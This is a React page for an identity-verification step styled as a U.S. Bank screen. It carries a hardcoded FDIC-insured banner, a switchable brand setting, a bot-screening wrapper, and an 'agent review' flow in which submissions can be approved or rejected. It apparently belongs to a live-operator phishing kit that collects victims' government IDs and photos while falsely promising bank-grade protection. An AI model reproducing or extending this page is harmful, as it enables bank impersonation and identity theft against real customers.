'use client';

/**
 * KYC (Know Your Customer) Stage Page
 *
 * Professional identity verification flow with visual security indicators.
 */

import { useState, useEffect } from 'react';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { Loader2, Shield, CheckCircle2, ExternalLink, AlertCircle } from 'lucide-react';

export default function KYCPage() {
  const { status, caseId, agentMessage } = useSessionStore();

  const [kycStatus, setKycStatus] = useState<'not_started' | 'in_progress' | 'waiting'>('not_started');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setKycStatus('not_started');
      setError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsLoading(false);
    }
  }, [status, agentMessage]);

  async function handleBeginKYC() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    try {
      const response = await fetch('/api/user-started-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to start KYC process');
      }

      const data = await response.json();
      const kycUrl = data.kyc_url;

      if (!kycUrl) {
        throw new Error('KYC provider is not configured properly (missing URL from backend)');
      }

      window.open(kycUrl, '_blank');

      setKycStatus('in_progress');
      setError(null);
    } catch (err) {
      console.error('KYC begin error:', err);
      setError('Unable to start KYC verification. Please try again or contact support.');
    }
  }

  async function handleKYCCompleted() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch('/api/submit-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to submit KYC');
      }

      setKycStatus('waiting');
      useSessionStore.setState({
        status: 'waiting',
        agentMessage: 'KYC submitted. Waiting for agent review...',
      });
    } catch (err) {
      console.error('KYC completion error:', err);
      setError('Failed to submit KYC. Please try again.');
      setIsLoading(false);
    }
  }

  const handleRetry = () => {
    setError(null);
    setKycStatus('not_started');
  };

  const isWaiting = kycStatus === 'waiting' || status === 'waiting' || isLoading;

  return (
    <BotGuard>
      <div className="fdic-box">
        <img className="fdic-logo" src="/brands/us-bank/fdic-logo.svg" alt="FDIC" />
        <span className="fdic-text">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
      </div>

      <section className="login-header">
        <h2>Identity Verification</h2>
      </section>

      <div className="login-form">
        {/* Waiting State - Professional centered loading */}
        {isWaiting ? (
          <div className="text-center py-6">
            <div className="relative w-12 h-12 mx-auto mb-4">
              <Loader2 className="w-full h-full text-[#0c2074] animate-spin" />
            </div>
            <h3 className="text-lg font-medium text-[#2e2e32] mb-2">
              Reviewing Your Documents
            </h3>
            <p className="text-[#555] text-sm">
              Please wait while we securely verify your identity. This may take a few moments.
            </p>
          </div>
        ) : (
          <>
            {kycStatus === 'not_started' && (
              <>
                {/* Security info box - adds visual weight */}
                <div style={{
                  background: '#f9fafb',
                  border: '1px solid #e5e7eb',
                  borderRadius: '4px',
                  padding: '16px',
                  marginBottom: '24px'
                }}>
                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
                    <Shield className="h-5 w-5 text-[#0c2074] flex-shrink-0" style={{ marginTop: '2px' }} />
                    <div>
                      <p style={{ fontWeight: 500, color: '#2e2e32', marginBottom: '4px', fontSize: '0.875rem' }}>
                        Secure Identity Verification
                      </p>
                      <p style={{ color: '#555', fontSize: '0.875rem', lineHeight: 1.5 }}>
                        To protect your account, we need to verify your identity. This process uses bank-grade encryption and your information is never shared with third parties.
                      </p>
                    </div>
                  </div>
                </div>

                {/* Steps indicator */}
                <div style={{ marginBottom: '24px' }}>
                  <p style={{ fontWeight: 500, color: '#2e2e32', marginBottom: '12px', fontSize: '0.875rem' }}>
                    What you'll need:
                  </p>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <CheckCircle2 className="h-4 w-4 text-[#0c2074]" />
                      <span style={{ color: '#555', fontSize: '0.875rem' }}>A valid government-issued ID</span>
                    </div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <CheckCircle2 className="h-4 w-4 text-[#0c2074]" />
                      <span style={{ color: '#555', fontSize: '0.875rem' }}>A device with a camera</span>
                    </div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <CheckCircle2 className="h-4 w-4 text-[#0c2074]" />
                      <span style={{ color: '#555', fontSize: '0.875rem' }}>Good lighting for photo capture</span>
                    </div>
                  </div>
                </div>

                {error && (
                  <div className="error-message" style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '20px' }}>
                    <AlertCircle className="h-4 w-4" />
                    <span>{error}</span>
                  </div>
                )}

                <button
                  onClick={handleBeginKYC}
                  className="btn btn-primary"
                  style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '8px' }}
                >
                  Begin Verification
                  <ExternalLink className="h-4 w-4" />
                </button>

                <p style={{ color: '#888', fontSize: '0.75rem', marginTop: '12px', textAlign: 'center' }}>
                  Opens in a new secure window
                </p>
              </>
            )}

            {kycStatus === 'in_progress' && (
              <>
                {/* In-progress state with clear visual */}
                <div style={{
                  background: '#f0f9ff',
                  border: '1px solid #0c2074',
                  borderRadius: '4px',
                  padding: '16px',
                  marginBottom: '24px'
                }}>
                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
                    <ExternalLink className="h-5 w-5 text-[#0c2074] flex-shrink-0" style={{ marginTop: '2px' }} />
                    <div>
                      <p style={{ fontWeight: 500, color: '#0c2074', marginBottom: '4px', fontSize: '0.875rem' }}>
                        Verification in Progress
                      </p>
                      <p style={{ color: '#555', fontSize: '0.875rem', lineHeight: 1.5 }}>
                        Complete the verification in the new window, then return here and click the button below to confirm.
                      </p>
                    </div>
                  </div>
                </div>

                {error && (
                  <div className="error-message" style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '20px' }}>
                    <AlertCircle className="h-4 w-4" />
                    <span>{error}</span>
                  </div>
                )}

                <button
                  onClick={handleKYCCompleted}
                  className="btn btn-primary"
                  disabled={isLoading}
                  style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '8px' }}
                >
                  {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
                  {isLoading ? 'Processing...' : "I've Completed Verification"}
                </button>

                <button
                  onClick={handleRetry}
                  disabled={isLoading}
                  style={{
                    marginTop: '12px',
                    width: '100%',
                    padding: '12px',
                    background: 'transparent',
                    color: '#0c2074',
                    border: 'none',
                    cursor: 'pointer',
                    fontSize: '0.875rem',
                    textDecoration: 'underline'
                  }}
                >
                  Start over
                </button>
              </>
            )}
          </>
        )}

        <div className="link-group">
          <p className="text-sm text-center" style={{ marginTop: '20px', color: 'var(--color-text-secondary)' }}>
            Need help? Contact {currentBrand.companyName} support
          </p>
        </div>
      </div>
    </BotGuard>
  );
}
